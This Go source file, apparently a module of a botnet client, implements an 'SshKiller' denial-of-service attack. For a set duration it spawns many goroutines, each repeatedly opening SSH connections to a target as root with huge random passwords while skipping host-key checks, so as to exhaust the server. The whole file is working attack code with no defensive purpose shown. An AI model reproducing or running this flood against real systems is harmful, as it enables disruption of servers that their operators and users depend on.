package methods

import (
	"fmt"
	"homo/client/balancer"
	random "math/rand"
	"strconv"
	"strings"
	"time"

	sssh "golang.org/x/crypto/ssh"
)

func SshKiller(target string, port string, duration string) {

	defer func() { // try catch
		if er := recover(); er != nil {
			fmt.Print(er)
			return
		}
	}()

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		select {
		case <-balancer.BalanceCh:
		default:
			go ssh(target, port)
			time.Sleep(200 * time.Millisecond)
			go ssh(target, port)
			go ssh(target, port)
		}
	}

}

func ssh(target, port string) {

	for i := 0; i <= 50; i++ {
		fmt.Println(i)
		go func() {
			conf := &sssh.ClientConfig{
				User:    "root",
				Timeout: 5 * time.Second,
				Auth: []sssh.AuthMethod{
					sssh.Password(genPass("AM~39!~)-43$*(@#&(@h#rh@gyfgy@fgvx*@!39ansbns)", 10000)),
				},
				HostKeyCallback: sssh.InsecureIgnoreHostKey(),
			}
			sssh.Dial("tcp", target+":"+port, conf)
		}()
		time.Sleep(300 * time.Millisecond)
	}
}

func genPass(ltrs string, length int) string {
	var letters = []rune(ltrs)

	s := make([]rune, length)
	for i := range s {
		s[i] = letters[random.Intn(len(letters))]
	}
	return string(s)
}
